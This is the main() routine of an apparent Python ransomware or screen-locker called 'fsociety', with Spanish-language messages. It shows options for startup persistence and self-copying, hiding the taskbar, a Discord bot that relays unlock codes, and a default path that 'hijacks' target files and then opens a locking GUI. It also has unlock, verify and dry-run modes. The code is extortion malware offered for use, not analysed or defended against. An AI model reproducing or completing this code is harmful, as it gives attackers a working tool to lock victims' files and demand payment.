    ap.add_argument("--uninstall", action="store_true")
    ap.add_argument("--taskbar-on", action="store_true")
    ap.add_argument("--force", action="store_true")
    ap.add_argument("--code", default=None)
    ap.add_argument("--target", action="append")
    ap.add_argument("file", nargs="?", default=None)
    args = ap.parse_args()

    load_config(force=True)
    if args.code:
        CODE = args.code
        STATE["code"] = args.code
        save_config()
    targets = [Path(t) for t in args.target] if args.target else TARGETS

    if args.taskbar_on:
        taskbar(True)
        print("[fsociety] barra de tareas restaurada.")
        return

    if args.install:
        BASE.mkdir(parents=True, exist_ok=True)
        try:
            shutil.copy2(Path(__file__).resolve(), SELFCOPY)
        except Exception:
            pass
        print("[fsociety] inicio automatico instalado." if install_startup()
              else "[fsociety] no se pudo instalar el inicio.")
        return

    if args.uninstall:
        print("[fsociety] quitado del inicio." if uninstall_startup()
              else "[fsociety] nada que quitar.")
        return

    if args.bot:
        b = DiscordBot(DISCORD_TOKEN,
                       on_key=lambda c: BOT_Q.put(("key", c)),
                       on_info=lambda t: BOT_Q.put(("info", t)))
        yo = b.quien_soy()
        if not yo:
            print("[bot] token invalido o sin conexion.")
            return
        print(f"[bot] conectado como {yo.get('username')}. escribe !code / !setcode")
        b.correr()
        return

    if args.rebuild:
        ensure_assets(force=True)
        print("[fsociety] icono, cara y QR regenerados (rojo).")
        return

    if args.rescue:
        print(f"[fsociety] restaurados {rescue_scan(targets)} archivos.")
        return

    if args.unlock:
        n, f = unlock(targets)
        print(f"[fsociety] restaurados {n} archivos. pendientes: {f}")
        return

    if args.verify:
        items, _ = _load_manifest()
        if not items:
            print("[fsociety] no hay manifest (nada secuestrado).")
            return
        mal = 0
        for item in items:
            d, ln, on = item[0], item[1], item[2]
            sz = item[3] if len(item) > 3 else -1
            lp = Path(d) / ln
            if not lp.exists():
                print(f"  falta   : {lp}")
                mal += 1
            elif sz >= 0 and _size(lp) != sz:
                print(f"  tamano  : {lp} ({_size(lp)} != {sz})")
                mal += 1
        print(f"[fsociety] {len(items)} entradas, {mal} con problemas.")
        return

    if args.dry_run:
        n = 0
        for p in iter_files(targets):
            print(p)
            n += 1
        print(f"--- {n} archivos serian secuestrados ---")
        return

    if MANIFEST.exists():
        try:
            data = json.loads(MANIFEST.read_text(encoding="utf-8"))
            count, since = data.get("n", 0), data.get("t", time.time())
        except Exception:
            count, since = 0, time.time()
        already = True
    else:
        already, count, since = False, 0, time.time()

    if args.no_gui:
        if not already:
            print(f"[fsociety] {lock(targets)} archivos secuestrados.")
        return

    if not args.force and not single_instance():
        print("[fsociety] ya hay una instancia corriendo.")
        return

    gui_main(targets, already, count, since)


if __name__ == "__main__":
    main()